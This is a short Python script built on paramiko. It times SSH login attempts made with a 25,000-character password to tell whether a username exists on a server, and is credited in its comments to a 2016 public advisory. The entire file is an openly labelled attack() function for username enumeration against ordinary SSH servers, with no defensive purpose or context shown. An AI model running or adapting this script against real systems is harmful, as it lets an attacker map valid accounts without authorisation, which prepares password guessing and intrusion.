import paramiko
import time
#user=raw_input("user: ")


#set up logging, this can be commented out (but will display a message complaining if so!)
paramiko.util.log_to_file("filename.log")

#takes a given username and web address and returns how long the response took
def attack(user, address):
	#THE CODE BELOW IS A MODIFIED VERSION OF EDDIE HARARI'S CODE (and some added comments)
	#THIS AND THE ADVISORY CAN BE FOUND AT https://seclists.org/fulldisclosure/2016/Jul/51
	
	#set up the long password
	p='A'*25000

	#use paramiko to set up the SSH
	ssh = paramiko.SSHClient()

	#->timer starts here
	starttime=time.clock()

	#ssh stuff
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
	   ssh.connect(address, username=user, password=p)
	   print("success")
	except:
	   endtime=time.clock()
	total=endtime-starttime

	#return the amount of time it took between 'starttime=...' and 'endtime=...'
	return total